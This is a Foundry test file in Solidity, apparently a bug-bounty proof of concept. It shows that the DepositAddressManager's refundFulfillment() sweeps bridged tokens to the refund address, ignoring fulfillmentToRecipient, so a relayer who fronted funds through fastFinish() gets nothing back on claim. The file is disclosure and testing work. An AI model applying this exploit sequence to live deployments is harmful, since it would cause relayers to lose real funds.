// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

import {DepositAddressManager, DAFulfillment} from "../src/DepositAddressManager.sol";
import {DepositAddressFactory} from "../src/DepositAddressFactory.sol";
import {DepositAddress, DAParams, DAFulfillmentParams} from "../src/DepositAddress.sol";
import {DaimoPayPricer} from "../src/DaimoPayPricer.sol";
import {PriceData} from "../src/interfaces/IDaimoPayPricer.sol";
import {IDepositAddressBridger} from "../src/interfaces/IDepositAddressBridger.sol";
import {TokenAmount} from "../src/TokenUtils.sol";
import {DaimoPayExecutor, Call} from "../src/DaimoPayExecutor.sol";
import {TestUSDC} from "./utils/DummyUSDC.sol";
import {DummyDepositAddressBridger} from "./utils/DummyDepositBridger.sol";

// ============================================================
// BUG: refundFulfillment() ignores fulfillmentToRecipient
//
// IMPACT: A relayer that calls fastFinish() (fronting their
// own capital to deliver funds to the user early) permanently
// loses their fronted tokens if refundFulfillment() is called
// after the intent expires.
//
// ROOT CAUSE:
// fastFinish() stores the relayer's address:
//   fulfillmentToRecipient[fulfillmentAddress] = relayer
//
// claim() honours this and repays the relayer.
//
// BUT refundFulfillment() NEVER checks fulfillmentToRecipient.
// It unconditionally sweeps funds to params.refundAddress,
// leaving the relayer with an uncollectable claim.
//
// SCENARIO:
// 1. Relayer calls fastFinish() before expiry:
//    - Fronts BRIDGE_AMOUNT USDC to deliver to user
//    - fulfillmentToRecipient[fulfillment] = RELAYER
// 2. Bridge completes: BRIDGE_AMOUNT USDC arrives at fulfillmentAddress
// 3. Intent expires (block.timestamp >= params.expiresAt)
// 4. Anyone calls refundFulfillment():
//    - Sweeps BRIDGE_AMOUNT to params.refundAddress
//    - Does NOT update fulfillmentToRecipient
// 5. Relayer calls claim(): gets 0 USDC back
//    - RELAYER net loss = BRIDGE_AMOUNT USDC
//
// DAIMO BOUNTY CRITERIA (from program page):
//   "A well-implemented relayer does everything right, but
//    still loses funds. These are High."
// ============================================================

contract AuditPoC_RefundFulfillmentStealsRelayerFunds is Test {
    // --------------------------------------------------------
    // Constants matching the existing test suite
    // --------------------------------------------------------
    uint256 private constant SOURCE_CHAIN_ID = 1;    // Ethereum
    uint256 private constant DEST_CHAIN_ID   = 8453; // Base

    address private constant RECIPIENT     = address(0x1234);
    address private constant REFUND_ADDRESS = address(0x5678);
    address private constant RELAYER       = address(0x9ABC);

    uint256 private constant TRUSTED_SIGNER_KEY = 0xa11ce;
    uint256 private constant MAX_PRICE_AGE      = 300; // 5 minutes

    uint256 private constant USDC_PRICE    = 1e18;  // $1 (18-decimal price)
    uint256 private constant BRIDGE_AMOUNT = 99e6;  // 99 USDC (6 decimals)

    uint256 private constant MAX_SLIPPAGE_BPS = 100; // 1 %

    // --------------------------------------------------------
    // Deployed contracts
    // --------------------------------------------------------
    DepositAddressManager private manager;
    DepositAddressFactory  private factory;
    DaimoPayPricer         private pricer;
    DummyDepositAddressBridger private bridger;
    TestUSDC               private usdc;

    address private trustedSigner;

    // --------------------------------------------------------
    // setUp - mirrors the existing DepositAddressManager tests
    // --------------------------------------------------------
    function setUp() public {
        vm.chainId(SOURCE_CHAIN_ID);

        trustedSigner = vm.addr(TRUSTED_SIGNER_KEY);

        pricer  = new DaimoPayPricer(trustedSigner, MAX_PRICE_AGE);
        bridger = new DummyDepositAddressBridger();
        factory = new DepositAddressFactory();

        // Predict manager address so executor can be wired to it
        address predictedManager = vm.computeCreateAddress(
            address(this),
            vm.getNonce(address(this)) + 1
        );
        DaimoPayExecutor executor = new DaimoPayExecutor(predictedManager);

        manager = new DepositAddressManager(address(this), factory, executor);
        require(address(manager) == predictedManager, "manager addr mismatch");

        manager.setRelayer(RELAYER, true);
        usdc = new TestUSDC();
    }

    // --------------------------------------------------------
    // PoC
    // --------------------------------------------------------
    function test_poc_refundFulfillment_steals_fastFinish_relayer_funds() public {
        // ====================================================
        // SETUP: Switch to destination chain, create intent
        // ====================================================
        vm.chainId(DEST_CHAIN_ID);

        // Short expiry - expires in 1000 seconds
        DAParams memory params = DAParams({
            toChainId:                      DEST_CHAIN_ID,
            toToken:                        usdc,
            toAddress:                      RECIPIENT,
            refundAddress:                  REFUND_ADDRESS,
            finalCallData:                  "",
            escrow:                         address(manager),
            bridger:                        IDepositAddressBridger(address(bridger)),
            pricer:                         pricer,
            maxStartSlippageBps:            MAX_SLIPPAGE_BPS,
            maxFastFinishSlippageBps:       MAX_SLIPPAGE_BPS,
            maxSameChainFinishSlippageBps:  MAX_SLIPPAGE_BPS,
            expiresAt:                      block.timestamp + 1000
        });

        TokenAmount memory bridgeTokenOut = TokenAmount({
            token:  usdc,
            amount: BRIDGE_AMOUNT
        });

        bytes32 relaySalt = keccak256("audit-poc-salt");

        // Compute the fulfillment address that will receive bridged tokens
        address depositAddress = factory.getDepositAddress(params);
        DAFulfillmentParams memory fulfillmentParams = DAFulfillmentParams({
            depositAddress: depositAddress,
            relaySalt:      relaySalt,
            bridgeTokenOut: bridgeTokenOut,
            sourceChainId:  SOURCE_CHAIN_ID
        });
        (address fulfillmentAddress, ) = manager.computeFulfillmentAddress(
            fulfillmentParams
        );

        // ====================================================
        // STEP 1: Relayer calls fastFinish - fronts BRIDGE_AMOUNT
        //         and delivers funds to user BEFORE bridge arrives
        // ====================================================
        PriceData memory priceData = _signedPrice(
            address(usdc),
            USDC_PRICE,
            block.timestamp
        );

        usdc.transfer(RELAYER, BRIDGE_AMOUNT);

        vm.startPrank(RELAYER);
        usdc.transfer(address(manager), BRIDGE_AMOUNT); // required by fastFinish
        manager.fastFinish({
            params:              params,
            calls:               new Call[](0),
            token:               usdc,
            bridgeTokenOutPrice: priceData,
            toTokenPrice:        priceData,
            bridgeTokenOut:      bridgeTokenOut,
            relaySalt:           relaySalt,
            sourceChainId:       SOURCE_CHAIN_ID
        });
        vm.stopPrank();

        // Verify: relayer is now recorded as the rightful recipient
        assertEq(
            manager.fulfillmentToRecipient(fulfillmentAddress),
            RELAYER,
            "relayer should be recorded as fastFinish recipient"
        );
        // Verify: user already received funds (relayer did their job)
        assertEq(
            usdc.balanceOf(RECIPIENT),
            BRIDGE_AMOUNT,
            "user should have received funds from fastFinish"
        );

        console.log("--- After fastFinish ---");
        console.log("RELAYER balance:       ", usdc.balanceOf(RELAYER));
        console.log("RECIPIENT balance:     ", usdc.balanceOf(RECIPIENT));
        console.log("REFUND_ADDRESS balance:", usdc.balanceOf(REFUND_ADDRESS));

        // ====================================================
        // STEP 2: Bridge completes - BRIDGE_AMOUNT arrives at
        //         fulfillmentAddress (simulating the real bridge)
        // ====================================================
        usdc.transfer(fulfillmentAddress, BRIDGE_AMOUNT);

        assertEq(
            usdc.balanceOf(fulfillmentAddress),
            BRIDGE_AMOUNT,
            "fulfillment address should hold bridged tokens"
        );

        // ====================================================
        // STEP 3: Intent expires
        // ====================================================
        vm.warp(params.expiresAt + 1);

        // ====================================================
        // STEP 4: refundFulfillment is called (by any relayer,
        //         e.g. a cleanup bot or the user themselves).
        //         NOTE: This does NOT check fulfillmentToRecipient.
        // ====================================================
        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = usdc;

        vm.prank(RELAYER); // even the same relayer calling it triggers the loss
        manager.refundFulfillment({
            params:        params,
            bridgeTokenOut: bridgeTokenOut,
            relaySalt:     relaySalt,
            sourceChainId: SOURCE_CHAIN_ID,
            tokens:        tokens
        });

        // fulfillmentAddress is now drained - tokens went to REFUND_ADDRESS
        assertEq(
            usdc.balanceOf(fulfillmentAddress),
            0,
            "fulfillment address should be empty after refundFulfillment"
        );
        assertEq(
            usdc.balanceOf(REFUND_ADDRESS),
            BRIDGE_AMOUNT,
            "REFUND_ADDRESS received the bridged tokens"
        );

        console.log("--- After refundFulfillment ---");
        console.log("fulfillmentAddress balance:", usdc.balanceOf(fulfillmentAddress));
        console.log("REFUND_ADDRESS balance:    ", usdc.balanceOf(REFUND_ADDRESS));

        // ====================================================
        // STEP 5: Relayer tries to claim - gets ZERO back.
        //         fulfillmentToRecipient still shows RELAYER
        //         (was never updated by refundFulfillment) but
        //         there is nothing left to pull.
        // ====================================================

        // fulfillmentToRecipient is still RELAYER - claim won't revert
        assertEq(
            manager.fulfillmentToRecipient(fulfillmentAddress),
            RELAYER,
            "fulfillmentToRecipient still shows RELAYER (not ADDR_MAX)"
        );

        uint256 relayerBalanceBefore = usdc.balanceOf(RELAYER);

        vm.prank(RELAYER);
        manager.claim({
            params:              params,
            calls:               new Call[](0),
            bridgeTokenOut:      bridgeTokenOut,
            bridgeTokenOutPrice: priceData,
            toTokenPrice:        priceData,
            relaySalt:           relaySalt,
            sourceChainId:       SOURCE_CHAIN_ID
        });

        uint256 relayerBalanceAfter = usdc.balanceOf(RELAYER);

        // ====================================================
        // FINAL ASSERTIONS - The bug is proven here
        // ====================================================
        console.log("--- After claim ---");
        console.log("RELAYER balance before claim:", relayerBalanceBefore);
        console.log("RELAYER balance after claim: ", relayerBalanceAfter);
        console.log("RELAYER net loss (USDC e6):  ", BRIDGE_AMOUNT);

        // Relayer received nothing from claim
        assertEq(
            relayerBalanceAfter,
            relayerBalanceBefore,
            "RELAYER received 0 from claim - funds stolen by refundFulfillment"
        );

        // Relayer fronted BRIDGE_AMOUNT and got nothing back: permanent loss
        assertEq(
            relayerBalanceAfter,
            0,
            "RELAYER has 0 USDC - their fronted capital is permanently lost"
        );

        // User got paid (as expected - user is fine, only relayer is harmed)
        assertEq(
            usdc.balanceOf(RECIPIENT),
            BRIDGE_AMOUNT,
            "user correctly received their funds via fastFinish"
        );

        // Refund address got the bridged tokens (should have gone to relayer)
        assertEq(
            usdc.balanceOf(REFUND_ADDRESS),
            BRIDGE_AMOUNT,
            "REFUND_ADDRESS received tokens that should have repaid relayer"
        );
    }

    // --------------------------------------------------------
    // Helpers (mirrors existing test suite)
    // --------------------------------------------------------
    function _signedPrice(
        address token,
        uint256 priceUsd,
        uint256 timestamp
    ) internal view returns (PriceData memory) {
        bytes32 messageHash = keccak256(
            abi.encodePacked(token, priceUsd, timestamp, block.chainid)
        );
        bytes32 ethHash = keccak256(
            abi.encodePacked("\x19Ethereum Signed Message:\n32", messageHash)
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(TRUSTED_SIGNER_KEY, ethHash);
        return PriceData({
            token:     token,
            priceUsd:  priceUsd,
            timestamp: timestamp,
            signature: abi.encodePacked(r, s, v)
        });
    }
}
